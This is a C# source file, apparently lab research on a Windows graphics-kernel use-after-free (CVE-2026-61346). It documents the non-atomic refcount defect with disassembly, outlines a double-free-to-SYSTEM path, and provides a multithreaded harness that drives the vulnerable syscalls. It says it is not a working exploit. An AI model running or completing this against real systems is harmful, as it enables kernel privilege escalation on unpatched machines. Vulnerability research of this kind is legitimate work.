// fliprace.cs
//
// CVE-2026-61346 - Windows Graphics Kernel (dxgkrnl.sys) use-after-free
// Non-atomic reference counting on CFlipResource / CFlipPropertySetBase.
//
// WHAT THIS IS
// ------------
// A race-window harness and reachability probe, NOT a working exploit. It
// reaches the flip-object syscall surface from an unprivileged process and
// spins N threads through the content-binding calls that drive the vulnerable
// reference counts, trying to land two threads inside the three-instruction
// window below. Winning the race (and turning the resulting double-free into
// code execution) is a separate, much larger effort; Microsoft rates this
// AC:H for the same reason.
//
// THE DEFECT, VERIFIED LIVE OVER KDNET (Win11 22H2 22621.6060)
// -----------------------------------------------------------
//   dxgkrnl!CFlipResource::Release:
//     push    rbx
//     sub     rsp,20h
//     add     dword ptr [rcx+18h], 0FFFFFFFFh   ; (A) decrement, NO lock prefix
//     mov     ebx, dword ptr [rcx+18h]          ; (B) SECOND, independent read
//     jne     +0x20
//     mov     rdx,[rcx]                         ; refcount hit 0:
//     mov     rax,[rdx]                         ;   load vtable
//     mov     edx,1
//     call    <destructor>                      ;   virtual call
//
// (A) is a read-modify-write with no `lock`, so on a multiprocessor system two
// cores can both read the old count, both decrement, and both write the same
// result. (B) re-reads the field a second time, so even an atomic (A) would
// still test a value from a different instant. Three instructions, two windows:
//
//   count = 2, T1 and T2 both Release():  both read 2, both write 1
//                                         -> one decrement lost, object leaks
//   count = 1, T1 and T2 both Release():  both observe the transition to 0
//                                         -> destructor runs twice -> double free
//
// The second interleaving is the CWE-416. The destructor is reached through a
// virtual call (`mov rax,[rdx]`), so an attacker who reallocates the freed
// block controls the call target -> the UAF-to-SYSTEM path.
//
// The Aug-2026 patch replaces (A)+(B) with `lock xadd` + a derived (not
// re-read) zero test, and adds real AddRef methods using _InterlockedIncrement
// -- both gated behind feature flag Feature_562023738.
//
// REACHABILITY NOTE (measured on the lab VM, this build)
// ------------------------------------------------------
// NtFlipObjectCreate succeeds from an ordinary process. But creating and then
// closing a flip object does NOT allocate or release CFlipResource /
// CFlipPropertySetBase: with breakpoints on both Release methods, 30 s of a
// tight create/close loop produced ZERO hits. Those objects are only born on
// the content-binding path (AddContent -> CreateFlipPropertySetWorker<
// CFlipPropertySet>), which needs the correct FlipPropertyItem layout and a
// producer/consumer endpoint role that were not reversed here -- AddContent
// returns STATUS_INVALID_PARAMETER / STATUS_ACCESS_DENIED with guessed
// arguments. On this VM the display adapter is the synthetic "Microsoft Hyper-V
// Video" with no WDDM flip-model support and there is no interactive session,
// so the present path is cold regardless. To actually contest the race you need
// those two structures reversed and hardware (or GPU-PV) that exercises the
// flip path. This harness is the scaffolding up to that point.
//
// Build (in-guest, no toolchain needed):
//   %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo ^
//       /out:fliprace.exe fliprace.cs
//
// Run:
//   fliprace.exe [threads=8] [seconds=30] [out=C:\eapoc\race.log]
//
// Pair it with a kernel debugger to watch for hits:
//   bp dxgkrnl!CFlipResource::Release
//   bp dxgkrnl!CFlipPropertySetBase::Release
//
// Lab use only.

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

class FlipRace
{
    // All 21 NtFlipObject* entry points are exported by win32u.dll, so a plain
    // DllImport reaches the syscall stubs -- no manual SSN work needed.
    [DllImport("win32u.dll", SetLastError = true)]
    static extern int NtFlipObjectCreate(IntPtr unused, out IntPtr handle);

    [DllImport("win32u.dll", SetLastError = true)]
    static extern int NtFlipObjectAddContent(IntPtr flip, ref ulong contentId,
                                             uint count, IntPtr items);

    [DllImport("win32u.dll", SetLastError = true)]
    static extern int NtFlipObjectSetContent(IntPtr flip, ref ulong contentId,
                                             IntPtr p3, IntPtr p4);

    [DllImport("win32u.dll", SetLastError = true)]
    static extern int NtFlipObjectRemoveContent(IntPtr flip, ref ulong contentId);

    [DllImport("ntdll.dll")]
    static extern int NtClose(IntPtr h);

    static IntPtr gFlip = IntPtr.Zero;
    static long gIter = 0;
    static long gReleasePathOk = 0;   // AddContent calls that returned >= 0
    static volatile bool gStop = false;
    static TextWriter gLog;

    static void Log(string s)
    {
        Console.WriteLine(s);
        if (gLog != null) { gLog.WriteLine(s); gLog.Flush(); }
    }

    static int Main(string[] a)
    {
        int threads = a.Length > 0 ? int.Parse(a[0]) : 8;
        int seconds = a.Length > 1 ? int.Parse(a[1]) : 30;
        string outp  = a.Length > 2 ? a[2] : null;

        if (outp != null) gLog = new StreamWriter(outp, false);
        try
        {
            Log("CVE-2026-61346 - dxgkrnl flip refcount race harness");
            Log("threads=" + threads + " seconds=" + seconds);
            Log(new string('-', 62));

            // ---- stage 1: reachability ----
            IntPtr h;
            int st = NtFlipObjectCreate(IntPtr.Zero, out h);
            Log("NtFlipObjectCreate -> 0x" + st.ToString("X8") +
                "  handle=0x" + h.ToInt64().ToString("X"));
            if (st < 0)
            {
                Log("[-] create failed; cannot proceed");
                return 1;
            }
            gFlip = h;

            // ---- stage 2: contend the content-binding paths ----
            Log("[*] spinning " + threads + " threads for " + seconds + "s");
            Log("    (attach KD with breakpoints on the two Release methods)");
            var ts = new Thread[threads];
            for (int i = 0; i < threads; i++)
            {
                ts[i] = new Thread(Worker) { IsBackground = true };
                ts[i].Start(i);
            }
            Thread.Sleep(seconds * 1000);
            gStop = true;
            Thread.Sleep(300);

            Log(new string('-', 62));
            Log("iterations           : " + Interlocked.Read(ref gIter));
            Log("AddContent accepted  : " + Interlocked.Read(ref gReleasePathOk));
            Log("survived (no bugcheck)");
            if (Interlocked.Read(ref gReleasePathOk) == 0)
                Log("[!] AddContent never succeeded -> the refcounted objects were " +
                    "never allocated. The FlipPropertyItem layout / endpoint role " +
                    "must be reversed before the race can be contested. See header.");
            else
                Log("[+] AddContent path entered; watch KD for Release hits.");
            return 0;
        }
        finally { if (gLog != null) gLog.Dispose(); }
    }

    static void Worker(object idx)
    {
        var rnd = new Random(((int)idx) * 7919 + Environment.TickCount);
        while (!gStop)
        {
            ulong contentId = 0;
            // count>=1 drives CreateFlipPropertySetWorker<CFlipPropertySet>,
            // which allocates the object whose refcount is the vulnerable one.
            int st = NtFlipObjectAddContent(gFlip, ref contentId, 1, IntPtr.Zero);
            if (st >= 0)
            {
                Interlocked.Increment(ref gReleasePathOk);
                NtFlipObjectSetContent(gFlip, ref contentId, IntPtr.Zero, IntPtr.Zero);
                NtFlipObjectRemoveContent(gFlip, ref contentId);   // drives Release
            }
            Interlocked.Increment(ref gIter);
        }
    }
}
